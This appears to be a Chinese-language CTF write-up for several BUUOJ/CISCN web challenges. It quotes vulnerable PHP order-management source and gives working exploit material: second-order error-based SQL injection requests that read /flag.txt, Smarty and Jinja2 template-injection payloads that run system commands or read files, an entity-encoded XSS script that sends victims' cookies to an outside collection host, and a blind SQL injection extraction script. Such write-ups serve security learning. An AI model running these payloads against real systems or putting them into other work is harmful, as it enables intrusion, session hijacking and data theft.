                <h1>删除订单</h1>
                <form method="post">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    </p>
                    <p>
                    <button class='btn btn-lg  btn-sub btn-white' type="submit">删除订单</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb" style="color:#ffffff;">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>
<div id="f">
    <div class="container">
		<div class="row">
            <h2 class="mb">订单管理</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>
            </a>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
		</div>
	</div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
```

```php+HTML
//config.php
<?php

ini_set("open_basedir", getcwd() . ":/etc:/tmp");

$DATABASE = array(

    "host" => "127.0.0.1",
    "username" => "root",
    "password" => "root",
    "dbname" =>"ctfusers"
);

$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);
```

```php+HTML
//confirm.php
<?php

require_once "config.php";
//var_dump($_POST);

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>确认订单</title>
<base href="./">
<meta charset="utf-8"/>

<link href="assets/css/bootstrap.css" rel="stylesheet">
<link href="assets/css/custom-animations.css" rel="stylesheet">
<link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
	<div class="container">
        <img class="logo" src="./assets/img/logo-zh.png">
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
                <a href="./index.php">
                <button class='btn btn-lg  btn-sub btn-white'>返回</button>
                </a>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
		<div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">订单管理</h2>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
		</div>
	</div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
```

在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。

因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。

```http
POST /confirm.php HTTP/1.1
Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
Connection: close
Referer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/
Upgrade-Insecure-Requests: 1

user_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#
```

```http
POST /change.php HTTP/1.1
Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
Connection: close
Referer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/
Upgrade-Insecure-Requests: 1

user_name=1&phone=1&address=1
```

回显数据

```
errorXPATH syntax error: 'flag{e9485017-ebf4-4ea4-8579-daa'
```

显示不全，再逆向输出一下

```http
POST /confirm.php HTTP/1.1
Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
Connection: close
Referer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/
Upgrade-Insecure-Requests: 1

user_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#
```

```http
POST /change.php HTTP/1.1
Host: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn
Connection: close
Referer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/
Upgrade-Insecure-Requests: 1

user_name=1&phone=1&address=1
```

输出内容

```
errorXPATH syntax error: '
}6e91d8479aad-9758-4ae4-4fbe-71'
```

拼接即可



## 华东南赛区 Web11

[关于SSTI](https://zhuanlan.zhihu.com/p/28823933)

打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For

![](/pic/94.png)

可能存在SSTI，测试一下的确存在SSTI

![](/pic/96.png)

在网页的最下方发现了**Build With Smarty** 

一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30

![](/pic/97.png)

Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了

![](/pic/98.png)

{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。

那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签

```
<script language="php">phpinfo();</script>
```

有一个[{if}标签](https://www.smarty.net/docs/zh_CN/language.function.if.tpl)可以使用

marty的`{if}`条件判断和PHP的[if](http://php.net/if) 非常相似，只是增加了一些特性。 每个`{if}`必须有一个配对的`{/if}`. 也可以使用`{else}` 和 `{elseif}`. 全部的PHP条件表达式和函数都可以在if内使用，如*||*, *or*, *&&*, *and*, *is_array()*, 等等.

将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo

![](/pic/99.png)

{if system('cat /flag')}{/if}即可获取到flag

[参考链接](https://www.jianshu.com/p/eb8d0137a7d3)



## 华东北赛区 Web2

使用御剑扫描发现login.php，admin.php

![](/pic/100.png)

访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿

![](/pic/101.png)

明显的提示这题是XSS

提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。

来自赵师傅的payload     svg标签 ：xml自动解析html实体编码

```php
in_str = "(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=dzWPkK&keepsession=0&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();"
output = ""
for c in in_str:
    output += "&#" + str(ord(c))
print("<svg><script>eval&#40&#34" + output + "&#34&#41</script>")
```

得到地址后去commitbug.php（反馈）页面提交url

![](/pic/102.png)

url中要将*.buuoj.cn改成web

附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）

```php
<?php

for($a=0;substr(md5($a),0,6)!='2ccf73';$a++){}
echo md5($a);
echo urldecode('%09');
echo $a;
 //2ccf731c402b81796327fb7a4c5cd943	225315
?>
```

去xss平台收cookie

![](/pic/103.png)

修改cookie为收到的cookie，访问admin.php   存在sql注入

![](/pic/104.png)![](/pic/105.png)

编写注入脚本

```python
# -*- coding: utf-8 -*-
# @Time    : 2/19/2020 12:34 AM
import requests

def str2hex(strs):
    hexs='0x'
    for x in range(len(strs)):
        hexs+=hex(ord(strs[x]))[2:]
    print(hexs)
    return hexs

def get(payload):
    url = 'http://da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn/admin.php?id=0^('+payload+')'
    # print(url)
    html = requests.get(url,cookies={'PHPSESSID':'e7f4c1e48fd638f2a517cbe6d0a81857'})
    # print(html)
    return html

def binsea(s_payload,len=999):
    result = ''
    x=1
    while x <= len :
        error = 0
        left = 0
        right = 126
        while left <= right:
            mid = (left + right) / 2
            payload = "ascii(substr((%s),%d,1))>%d" % (s_payload,x, mid)

            res = get(payload)
            if res.status_code == 404 or res.status_code == 429:
                x=x-1
                error = 1
                break
            html=res.text
            # print(html,'*-*-*-*-*-*', mid)
            if '不能查询管理员哦'  in html:
                left = mid +1
            else:
                right = mid -1
        mid = int((left + right + 1) / 2)
        if mid == 0 :
            break
        if error == 0 :
            result += chr(mid)
            print(result)
        x=x+1
    return result

def get_database():
    s_payload='database()'
    database = binsea(s_payload)
    print(database)

def get_tables(db):
    db=str2hex(db)
    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='+db+')'
    tables=binsea(s_payload)

def get_columns(table):
    table = str2hex(table)
    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'
    columns=binsea(s_payload)

def get_data(columns,table):
    s_payload='select(group_concat('+columns+'))from('+table+')'
    password=binsea(s_payload)


# get_database() #ciscn

# get_tables('ciscn') #flag,users

# get_columns('flag') #flagg

get_data('flagg','flag') #flag{88331b80-7fb8-4f2f-9fa1-a4b85bd8562d}
```



## 华东南赛区 Double Secret

打卡题目的提示是:`Welcome To Find Secret`

使用御剑扫一下目录，扫描到robots.txt

内容是: `It is Android ctf`

尝试范围/secret  提示`Tell me your secret.I will encrypt it so others can't see`

传入参数?secret=123456789后报错

![](/pic/106.png)

发现是flask框架，点开/app/app.py后有如下代码

```python
File "/app/app.py", line 35, in secret

    if(secret==None):

        return 'Tell me your secret.I will encrypt it so others can\'t see'

    rc=rc4_Modified.RC4("HereIsTreasure")   #解密

    deS=rc.do_crypt(secret)


    a=render_template_string(safe(deS))

 [Open an interactive python shell in this frame]  

    if 'ciscn' in a.lower():
python
        return 'flag detected!'

    return a
```

是RC4加密，RC4算法加密又是解密将payload加密就好

```python
# -*- coding: utf-8 -*-
# @Time    : 2/25/2020 11:38 PM
import urllib
import requests


class RC4:
    def __init__(self, key):
        self.key = key
        self.key_length = len(key)
        self._init_S_box()

    def _init_S_box(self):
        self.Box = [i for i in range(256)]
        k = [self.key[i % self.key_length] for i in range(256)]
        j = 0
        for i in range(256):
            j = (j + self.Box[i] + ord(k[i])) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]

    def crypt(self, plaintext):
        i = 0
        j = 0
        result = ''
        for ch in plaintext:
            i = (i + 1) % 256
            j = (j + self.Box[i]) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]
            t = (self.Box[i] + self.Box[j]) % 256
            result += chr(self.Box[t] ^ ord(ch))
        return result


url = "http://69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn/secret?secret="
a = RC4('HereIsTreasure')
cmd = "{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}"
payload = urllib.parse.quote(a.crypt(cmd))
print(payload)
res = requests.get(url + payload)
print(res.text)
```

